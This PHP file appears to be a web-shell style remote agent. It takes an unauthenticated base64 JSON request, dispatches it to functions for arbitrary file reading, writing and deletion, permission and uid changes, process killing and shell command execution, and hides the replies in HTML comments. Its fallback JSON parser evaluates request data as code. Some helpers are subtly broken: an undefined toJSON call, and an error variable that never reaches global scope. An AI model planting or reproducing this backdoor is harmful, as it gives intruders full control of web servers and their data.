<?php

define('BLOCK_SIZE', 1024 * 512);

function rpc_fs_read($args)
{
  $file = fopen($args[0],"rb");
  fseek($file,intval($args[1]));

  $data = fread($file,BLOCK_SIZE);

  fclose($file);
  return $data;
}

function rpc_fs_write($args)
{
  $file = fopen($args[0],"wb");
  fseek($file,intval($args[1]));

  $length = fwrite($file,$args[2]);

  fclose($file);
  return $length;
}

function rpc_fs_stat($args)
{
  $data = stat($args[0]);

  return Array(
    'inode'     => $data[1],
    'mode'      => $data[2],
    'nlinks'    => $data[3],
    'uid'       => $data[4],
    'gid'       => $data[5],
    'size'      => $data[7],
    'atime'     => $data[8],
    'mtime'     => $data[9],
    'ctime'     => $data[10],
    'blocksize' => $data[11],
    'blocks'    => $data[12]
  );
}

function rpc_fs_getcwd($args) { return getcwd(); }
function rpc_fs_chdir($args)  { return chdir($args[0]); }
function rpc_fs_glob($args)   { return glob($args[0]); }
function rpc_fs_mktemp($args) { return tempnam(sys_get_temp_dir(),$args[0]); }
function rpc_fs_mkdir($args)  { return mkdir($args[0]); }
function rpc_fs_copy($args)   { return copy($args[0],$args[1]); }
function rpc_fs_unlink($args) { return unlink($args[0]); }
function rpc_fs_rmdir($args)  { return rmdir($args[0]); }
function rpc_fs_move($args)   { return rename($args[0],$args[1]); }
function rpc_fs_link($args)   { return link($args[0],$args[1]); }
function rpc_fs_chown($args)  { return chown($args[0],$args[1]); }
function rpc_fs_chgrp($args)  { return chgrp($args[0],$args[1]); }
function rpc_fs_chmod($args)  { return chmod($args[0],$args[1]); }

function rpc_sys_getpid($args)  { return posix_getpid(); }
function rpc_sys_getppid($args) { return posix_getppid(); }
function rpc_sys_getuid($args)  { return posix_getuid(); }
function rpc_sys_setuid($args)  { return posix_setuid(intval($args[0])); }
function rpc_sys_geteuid($args) { return posix_geteuid(); }
function rpc_sys_seteuid($args) { return posix_seteuid(intval($args[0])); }
function rpc_sys_getgid($args)  { return posix_getgid(); }
function rpc_sys_setgid($args)  { return posix_setgid(intval($args[0])); }
function rpc_sys_getegid($args) { return posix_getegid(); }
function rpc_sys_setegid($args) { return posix_setegid(intval($args[0])); }
function rpc_sys_getsid($args)  { return posix_getsid(); }
function rpc_sys_setsid($args)  { return posix_setsid(); }
function rpc_sys_kill($args)
{
  $signal = constant("SIG{$args[1]}");

  return posix_kill(intval($args[0]),$signal);
}
function rpc_sys_getcwd($args)  { return rpc_fs_getcwd($args); }
function rpc_sys_chdir($args)   { return rpc_fs_chdir($args); }
function rpc_sys_time($args)    { return time(); }

define('SHELL_OUTPUT_DELIMINATOR', str_repeat('#',80));

function rpc_shell_exec($args)
{
  $command = join(' ',$args);
  $command .= '; echo "' . SHELL_OUTPUT_DELIMINATOR . '"';
  $command .= '; env';

  $output  = shell_exec($command);

  list($output,$env_dump) = explode(SHELL_OUTPUT_DELIMINATOR,$output,2);

  $output   = chop($output);
  $env_dump = preg_split('/\r?\n/',trim($env_dump,"\r\n"));
  $env      = Array();

  foreach ($env_dump as $name_value)
  {
    list($name,$value) = explode('=',$name_value,2);
    $env[$name] = $value;
  }

  return Array('output' => $output, 'env' => $env);
}

if (!function_exists('json_encode'))
{
  // https://code.google.com/p/simplejson-php/
  function json_encode($value)
  {
    if ($value === null) { return 'null'; };  // gettype fails on null?

    $out = '';
    $esc = "\"\\/\n\r\t" . chr( 8 ) . chr( 12 );  // escaped chars
    $l   = '.';  // decimal point

    switch ( gettype( $value ) ) 
    {
    case 'boolean':
      $out .= $value ? 'true' : 'false';
      break;

    case 'float':
    case 'double':
      // PHP uses the decimal point of the current locale but JSON expects %x2E
      $l = localeconv();
      $l = $l['decimal_point'];
      // fallthrough...

    case 'integer':
      $out .= str_replace( $l, '.', $value );  // what, no getlocale?
      break;

    case 'array':
      // if array only has numeric keys, and is sequential... ?
      for ($i = 0; ($i < count( $value ) && isset( $value[$i]) ); $i++);
      if ($i === count($value)) {
        // it's a "true" array... or close enough
        $out .= '[' . implode(',', array_map('toJSON', $value)) . ']';
        break;
      }
      // fallthrough to object for associative arrays... 

    case 'object':
      $arr = is_object($value) ? get_object_vars($value) : $value;
      $b = array();
      foreach ($arr as $k => $v) {
        $b[] = '"' . addcslashes($k, $esc) . '":' . toJSON($v);
      }
      $out .= '{' . implode( ',', $b ) . '}';
      break;

    default:  // anything else is treated as a string
      return '"' . addcslashes($value, $esc) . '"';
      break;
    }
    return $out;
  }
}

if (!function_exists('json_decode'))
{
  // https://code.google.com/p/simplejson-php/
  function json_decode($json, $assoc = false) {
    /* by default we don't tolerate ' as string delimiters
       if you need this, then simply change the comments on
       the following lines: */

    // $matchString = '/(".*?(?<!\\\\)"|\'.*?(?<!\\\\)\')/';
    $matchString = '/".*?(?<!\\\\)"/';

    // safety / validity test
    $t = preg_replace( $matchString, '', $json );
    $t = preg_replace( '/[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/', '', $t );
    if ($t != '') { return null; }

    // build to/from hashes for all strings in the structure
    $s2m = array();
    $m2s = array();
    preg_match_all( $matchString, $json, $m );
    foreach ($m[0] as $s) {
      $hash       = '"' . md5( $s ) . '"';
      $s2m[$s]    = $hash;
      $m2s[$hash] = str_replace( '$', '\$', $s );  // prevent $ magic
    }

    // hide the strings
    $json = strtr( $json, $s2m );

    // convert JS notation to PHP notation
    $a = ($assoc) ? '' : '(object) ';
    $json = strtr( $json, 
      array(
        ':' => '=>', 
        '[' => 'array(', 
        '{' => "{$a}array(", 
        ']' => ')', 
        '}' => ')'
      ) 
    );

    // remove leading zeros to prevent incorrect type casting
    $json = preg_replace( '~([\s\(,>])(-?)0~', '$1$2', $json );

    // return the strings
    $json = strtr( $json, $m2s );

    /* "eval" string and return results. 
       As there is no try statement in PHP4, the trick here 
       is to suppress any parser errors while a function is 
       built and then run the function if it got made. */
    $f = @create_function( '', "return {$json};" );
    $r = ($f) ? $f() : null;

    // free mem (shouldn't really be needed, but it's polite)
    unset( $s2m ); unset( $m2s ); unset( $f );

    return $r;
  }
}

global $rpc_exception;

function rpc_error_handler($errno,$errstr)
{
  switch ($errno)
  {
  case E_WARNING:
  case E_USER_WARNING:
  case E_ERROR:
  case E_USER_ERROR:
    $rpc_exception = $errstr;
  }
}

function rpc_call($request)
{
  if (isset($request['cwd'])) { chdir($request['cwd']); }

  if (is_array($request['env']))
  {
    foreach ($request['env'] as $name => $value)
    {
      putenv("{$name}={$value}");
    }
  }

  $method    = "rpc_{$request['method']}";
  $arguments = $request['arguments'];

  set_error_handler('rpc_error_handler');
  $value = call_user_func($method,$arguments);

  if (isset($rpc_exception))
  {
    return Array('exception' => $rpc_exception);
  }
  else
  {
    return Array('value' => $value);
  }
}

if (isset($_REQUEST['rpc_request']))
{
  $request  = rawurldecode($_REQUEST['rpc_request']);
  $request  = json_decode(base64_decode($request));

  $response = base64_encode(json_encode(rpc_call($request)));

  echo("<!-- <rpc-response>{$response}</rpc-response> -->");
}

?>
